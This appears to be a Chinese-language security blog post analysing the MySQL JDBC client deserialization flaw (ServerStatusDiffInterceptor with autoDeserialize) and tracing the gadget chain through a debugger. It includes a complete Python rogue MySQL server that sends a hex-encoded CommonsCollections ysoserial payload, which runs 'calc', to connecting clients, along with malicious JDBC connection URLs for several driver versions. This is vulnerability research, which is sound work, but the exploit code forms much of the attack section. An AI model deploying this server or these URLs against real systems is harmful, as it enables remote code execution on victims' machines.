## 0x01 前言

听师傅们说这条链子用的比较广泛，所以最近学一学，本来是想配合着 tabby 或是 codeql 一起看的，但是 tabby 的环境搭建一直有问题，耽误了很久时间，所以就直接看了

## 0x02 JDBC 的基础

- 本来不太想写这点基础的，但想了想觉得还是要补一点

JDBC 对数据库的操作一般有以下步骤

- 导入包：要求您包含包含数据库编程所需的 JDBC 类的软件包。通常，使用 `import java.sql.*` 就足够了。
- 注册 JDBC 驱动程序：要求您初始化驱动程序，以便您可以打开与数据库的通信通道。
- 建立连接：需要使用 `* DriverManager.getConnection ()*` 方法来创建一个 Connection 对象，该对象表示与数据库服务器的物理连接。要创建新的数据库，在准备数据库 URL 时，无需提供任何数据库名称，如下面的示例所述。
- 执行查询：需要使用 Statement 类型的对象来构建 SQL 语句并将其提交到数据库。
- 清理：需要显式关闭所有数据库资源，而不是依赖 JVM 的垃圾回收。

例如创建一个数据库

JAVA

```
// 步骤 1. 导入所需的软件包
import java.sql.*;

public class JDBCExample {
   // JDBC 驱动程序名称和数据库 URL
   static final String JDBC_DRIVER = "com.mysql.jdbc.Driver";  
   static final String DB_URL = "jdbc:mysql://localhost/";

   //  数据库凭证
   static final String USER = "username";
   static final String PASS = "password";
   
   public static void main(String[] args) {
   Connection conn = null;
   Statement stmt = null;
   try{
      // 步骤 2：注册 JDBC 驱动程序
      Class.forName("com.mysql.jdbc.Driver");

      // 步骤 3：建立连接
      System.out.println("Connecting to database...");
      conn = DriverManager.getConnection(DB_URL, USER, PASS);

      // 步骤 4：执行查询
      System.out.println("Creating database...");
      stmt = conn.createStatement();
      
      String sql = "CREATE DATABASE STUDENTS";
      stmt.executeUpdate(sql);
      System.out.println("Database created successfully...");
   }catch(SQLException se){
      // 处理 JDBC 错误
      se.printStackTrace();
   }catch(Exception e){
      // 处理 Class.forName 的错误
      e.printStackTrace();
   }finally{
      // 用于关闭资源
      try{
         if(stmt!=null)
            stmt.close();
      }catch(SQLException se2){
      
      }
      try{
         if(conn!=null)
            conn.close();
      }catch(SQLException se){
         se.printStackTrace();
      }
   }// 结束 try
   System.out.println("Goodbye!");
}// 结束 main
}// 结束 JDBCExample
```

这一个 MySQL-JDBC 的漏洞简单来说就是 MySQL 对服务器的请求过程利用

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/interactiveJDBC.png)

正常的命令执行得到结果后就结束了，但是如果响应的结果是一个恶意的 poc 并且在后续过程中进行了反序列化，那么就可以用来执行任意命令了

## 0x03 漏洞分析

### 漏洞原理

如果攻击者能够控制 JDBC 连接设置项，那么就可以通过设置其指向恶意 MySQL 服务器进行 `ObjectInputStream.readObject()` 的反序列化攻击从而 RCE。

具体点说，就是通过 JDBC 连接 MySQL 服务端时，会有几个内置的 SQL 查询语句要执行，其中两个查询的结果集在 MySQL 客户端被处理时会调用 `ObjectInputStream.readObject()` 进行反序列化操作。如果攻击者搭建恶意 MySQL 服务器来控制这两个查询的结果集，并且攻击者可以控制 JDBC 连接设置项，那么就能触发 MySQL JDBC 客户端反序列化漏洞。

可被利用的两条查询语句：

- SHOW SESSION STATUS
- SHOW COLLATION

### 链子

**pom.xml**

XML

```
<dependency>  
  <groupId>commons-collections</groupId>  
  <artifactId>commons-collections</artifactId>  
  <version>3.2.1</version>  
</dependency>  
<dependency>  
  <groupId>mysql</groupId>  
  <artifactId>mysql-connector-java</artifactId>  
  <version>8.0.13</version>  
</dependency>
```

CC 链作为命令执行的部分，也就是说需要我们找一个 JDBC 合理的入口类，并且这个入口类需要在 JDBC 连接过程中被自动执行，最终是找到了这样一个类 `com.mysql.cj.jdbc.result.ResultSetImpl`，它的 `getObject()` 方法调用了 `readObject()` 方法

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/ResultSetImplGetObject.png)

JDBC 通过 MySQL 数据库查询数据会返回一个结果集，将查询到的结果返回给程序，并将结果封装在 `ResultSetImpl` 这个类中。

所以这个类不满足**用户可控输入**这一点，所以我们应该要去找谁调用了 `ResultSetImpl#getObject()`

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/ResultSetUtil.png)

根据网上的链子是 `ResultSetUtil` 类调用了 `ResultSetImpl#getObject()`，并且能够继续向上调用（如果 tabby 或者其他工具搞好了应该会用那些工具分析）

`ResultSetUtil` 这个类是用来处理一些测试实例的结果，或者是 profiler 的结果。简而言之还是用来做数据处理的类，继续往上看谁调用了它。

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/ServerStatusDiffInterceptor.png)

最终是 `com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues` 方法调用了 `ResultSetUtil#resultSetToMap`

`ServerStatusDiffInterceptor` 是一个拦截器，在 JDBC URL 中设定属性 `queryInterceptors` 为 `ServerStatusDiffInterceptor` 时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，这是一个自动执行的过程，我们可以把它作为利用链头。

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/preprocess.png)

看一下 `populateMapWithSessionStatusValues` 方法的代码

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/populateMapWithSessionStatusValues.png)

先建立了 JDBC 的连接，并创建查询，查询语句是 `SHOW SESSION STATUS`，接着调用 `ResultSetUtil.resultSetToMap`，完成查询并封装查询结果。

### 漏洞复现

- 之前看 Y4tacker 师傅的文章时，发现有提到是直接用 python 脚本打，里面有很多数据，但是这个 ”打“ 肯定不是空穴来风的，所以需要再明确一下攻击思路。

环境搭建可能会踩坑，若有师傅踩坑了可以滴我一下

我们需要先伪造数据包，并用 wireshark 抓包，观测一下流量，编写 Test 类内容如下

JAVA

```
import java.sql.*;  
  
public class Test {  
    public static void main(String[] args) throws Exception {  
        Class.forName("com.mysql.jdbc.Driver");  
        String jdbc_url = "jdbc:mysql://192.168.116.129:3306/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai" +  
                "&autoDeserialize=true" +  
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";  
        Connection con = DriverManager.getConnection(jdbc_url, "root", "123123");  
    }  
}
```

通过 `tcp.port == 3306 && mysql` 来过滤协议

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/catchMySQL.png)

我们需要用 python 脚本伪造的 MySQL 服务端需要伪造的是 `Greeting` 数据包 `Response OK` 、`Response Response OK` 以及 JDBC 执行查询语句 `SHOW SESSION STATUS` 的返回包等，我们逐个来分析。

首先是 `greeting` 数据包

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/greetingData.png)

这里发送 `greeting` 数据包之后需要发送 `Login` 请求，`Login` 请求里面包含了 user 和 db 以及 password，在这之后才会返回 Response OK 的数据包

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/AfterLogin.png)

Login 的请求包在发送完 `greeting` 包之后会自动发送，所以我们只需要发送一段 `greeting` 数据包，返回一段 Response OK 数据包即可，Response OK 包如下

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/ResponseOKBag.png)

继续往下，需要编写四个 Request Query 包的 Response 包后，才是 `SHOW SESSION STATUS`

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/FourRequestQuery.png)

响应包的编写需要我们将 MySQL Protocol 的部分全部复制进来

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/MySQLProtocolData.png)

如此，构造出最后的 fake MySQL 服务端

PYTHON

```
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a 
    file= r'a'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                #获取payload
                payload_content=get_payload_content()
                #计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                #计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3309

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

在本地运行，并运行 JDBC 的连接代码

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/CalcSuccess.png)

再来看 Fake MySQL 服务端这边的响应，是能收到包，并且发包的；相当清晰

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/FakeMySQLResponse.png)

### 调试分析

- 在 `com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues` 下个断点，开始调试分析

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/DebugPoint.png)

往下跟，先运行查询语句 `SHOW SESSION STATUS`，接着调用了 `ResultSetUtil.resultSetToMap()`

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/resultSetToMap.png)

`ResultSetUtil.resultSetToMap()` 调用了 `getObject()` 方法，第一处调用 `getObject()` 方法回返回 null，第二次调用时才会走到反序列化的代码逻辑里面。

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/colomnIndex2.png)

在调用 `getObject()` 方法中，判断 MySQL 的类型为 BLOB 后，就从 MySQL 服务端中获取对应的字节码数据

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/JudgeBlob.png)

从 MySQL 服务端获取到字节码数据后，判断 `autoDeserialize` 是否为 true、字节码数据是否为序列化对象等，最后调用 `readObject()` 触发反序列化漏洞

![img](https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/readObject.png)

### 不同 MySQL-JDBC-Driver 的 payload

#### 8.x

如上述 Demo：

JAVA

```
"jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai" +  
        "&autoDeserialize=true" +  
    "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
```

#### 6.x

属性名不同，queryInterceptors 换为 statementInterceptors

JAVA

```
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

#### >=5.1.11

包名中没有cj

JAVA

```
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

#### 5.x <= 5.1.10

同上，但需要连接后执行查询。

#### 5.1.29 - 5.1.40

JAVA

```
jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&autoDeserialize=true
```

#### 5.1.28 - 5.1.19

JAVA

```
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
```

## 0x04 小结

总体来说还是比较简单的一条链子，但是需要注意到需要将 MySQL 字段类型修改为 BLOB 才可以。

## 0x05 Reference

[https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E](https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC反序列化漏洞)
https://xz.aliyun.com/t/8159